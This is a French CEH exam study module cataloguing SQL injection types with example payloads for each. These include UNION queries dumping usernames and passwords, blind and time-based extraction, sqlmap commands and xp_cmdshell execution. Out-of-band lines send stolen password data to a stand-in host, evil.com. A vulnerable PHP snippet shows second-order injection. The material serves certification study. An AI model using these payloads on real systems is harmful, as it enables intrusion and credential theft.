# 🔴 Module 15 — Types de SQL Injection

> **CEH v13 | EC-Council**  
> `#ErrorBased` `#UnionBased` `#BlindBoolean` `#TimeBased` `#OOB`

---

## 📌 Table des matières

1. [Error-based SQLi](#1-error-based-sqli)
2. [UNION-based SQLi](#2-union-based-sqli)
3. [Blind Boolean-based SQLi](#3-blind-boolean-based)
4. [Time-based Blind SQLi](#4-time-based-blind)
5. [Out-of-Band SQLi](#5-out-of-band-oob)
6. [Second-Order Injection](#6-second-order)
7. [Stacked Queries](#7-stacked-queries)

---

## 1. Error-Based SQLi

Extraire des données via les messages d'erreur SQL.

```sql
-- MySQL — EXTRACTVALUE :
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e)) --

-- Résultat dans l'erreur :
ERROR 1105 (HY000): ~5.7.30-log~
→ Version MySQL extraite !

-- MySQL — UPDATEXML :
' AND UPDATEXML(1, CONCAT(0x7e, (SELECT user()), 0x7e), 1) --

-- MSSQL — Conversion d'erreur :
' AND 1=CONVERT(int, (SELECT TOP 1 name FROM sysobjects WHERE xtype='U')) --

-- Oracle :
' AND 1=UTL_INADDR.get_host_address((SELECT username FROM all_users WHERE ROWNUM=1)) --
```

---

## 2. UNION-Based SQLi

Ajouter une clause UNION SELECT pour extraire des données supplémentaires.

```sql
-- Étape 1 : Déterminer le nombre de colonnes
-- Méthode ORDER BY :
' ORDER BY 1 --    → OK
' ORDER BY 2 --    → OK
' ORDER BY 3 --    → OK
' ORDER BY 4 --    → ERREUR → 3 colonnes !

-- Méthode UNION SELECT NULL :
' UNION SELECT NULL --           → OK ou erreur
' UNION SELECT NULL, NULL --     → OK ou erreur
' UNION SELECT NULL, NULL, NULL--→ OK → 3 colonnes !

-- Étape 2 : Trouver les colonnes affichées
' UNION SELECT 'test1', 'test2', 'test3' --
→ Quel champ affiche 'test1', 'test2' ou 'test3' ?

-- Étape 3 : Extraire les données
' UNION SELECT table_name, 2, 3 FROM information_schema.tables --
→ Liste toutes les tables !

' UNION SELECT column_name, 2, 3 FROM information_schema.columns WHERE table_name='users' --
→ Liste les colonnes de 'users' !

' UNION SELECT username, password, 3 FROM users --
→ Exfiltre username et password !
```

---

## 3. Blind Boolean-based SQLi

Déduire les données par des réponses true/false sans données visibles.

```sql
-- Exemple : page qui affiche "Produit trouvé" ou "Non trouvé"

-- Test de base :
GET /product?id=1 AND 1=1 --   → "Produit trouvé" (true)
GET /product?id=1 AND 1=2 --   → "Non trouvé" (false)
→ Injection confirmée !

-- Extraire la version MySQL caractère par caractère :
id=1 AND SUBSTRING(version(), 1, 1)='5' --   → true si commence par 5
id=1 AND SUBSTRING(version(), 1, 1)='8' --   → true si commence par 8

-- Extraire un mot de passe :
id=1 AND SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1)='a' --
→ Si true → premier caractère = 'a'
id=1 AND SUBSTRING((SELECT password FROM users WHERE username='admin'), 2, 1)='d' --
→ Si true → deuxième caractère = 'd'

-- Automatisé avec sqlmap :
sqlmap -u "http://target.com/product?id=1" --technique=B --dump
```

---

## 4. Time-based Blind SQLi

Déduire les données par le délai de réponse.

```sql
-- MySQL :
id=1 AND IF(1=1, SLEEP(5), 0) --
→ Si vulnérable → réponse après 5 secondes

-- Extraire la version :
id=1 AND IF(SUBSTRING(version(),1,1)='8', SLEEP(5), 0) --
→ Délai de 5s → Version commence par '8' ✓

-- MSSQL :
id=1; IF (1=1) WAITFOR DELAY '0:0:5'--
→ Si vulnérable → réponse après 5 secondes

-- PostgreSQL :
id=1; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END --

-- Oracle :
id=1 AND 1=1 AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
```

---

## 5. Out-of-Band (OOB) SQLi

Exfiltrer les données via un canal externe (DNS, HTTP). Utile quand la réponse HTTP ne contient rien.

```sql
-- MySQL — DNS Exfiltration :
id=1 UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.evil.com\\share')) --
→ Le serveur DB fait une requête DNS vers : password_hash.evil.com
→ L'attaquant voit la requête sur son serveur DNS !

-- MSSQL — DNS via xp_dirtree :
id=1; EXEC master..xp_dirtree '\\' + (SELECT TOP 1 password FROM users) + '.evil.com\share'--

-- Oracle — HTTP via UTL_HTTP :
id=1 UNION SELECT UTL_HTTP.REQUEST('http://evil.com/?data='||(SELECT password FROM users WHERE rownum=1)) FROM dual--
```

---

## 6. Second-Order Injection

Le payload est stocké puis exécuté dans un second contexte.

```
Étape 1 : Inscription avec username malveillant
  username = admin'--

Étape 2 : Le username est stocké "proprement" dans la DB
  DB record : username = "admin'--"

Étape 3 : Changement de mot de passe (utilise le username stocké)
  Code PHP :
  $username = $_SESSION['username'];  // = admin'--
  $query = "UPDATE users SET password='$newpass' WHERE username='$username'";
  
  Requête générée :
  UPDATE users SET password='attacker_pass' WHERE username='admin'--'
  → Change le mot de passe d'admin !
```

---

## 7. Stacked Queries

Exécuter plusieurs requêtes séparées par `;`.

```sql
-- MSSQL (supporte nativement les stacked queries) :
id=1; INSERT INTO admin (user,pass) VALUES ('hacker','pwned')--
id=1; EXEC xp_cmdshell 'whoami'--  ← RCE si xp_cmdshell activé !

-- PostgreSQL :
id=1; CREATE TABLE hacked (data text)--

-- MySQL :
-- Note : MySQL + PDO supporte les stacked queries
-- MySQL + mysql_query() = généralement 1 requête à la fois

-- sqlmap pour stacked queries :
sqlmap -u "http://target.com/?id=1" --technique=S
```

---

## 🧠 Points clés à retenir pour l'examen

| Type | Méthode | Quand l'utiliser |
|------|---------|-----------------|
| Error-based | Messages d'erreur SQL | Erreurs SQL affichées |
| Union-based | UNION SELECT | Page retourne des données |
| Boolean blind | true/false comportement | Réponse différente selon condition |
| Time-based | SLEEP/WAITFOR | Aucune différence visible |
| OOB | DNS/HTTP externe | Tout filtré, réseau sortant possible |
| Second-order | Stocké puis exécuté | Input stocké en DB |
| Stacked | Multiple ; | MSSQL, certains MySQL |

---

*⬅️ [Concepts fondamentaux](./01_concepts_fondamentaux.md) | ➡️ [Techniques avancées](./03_techniques_avancees.md)*
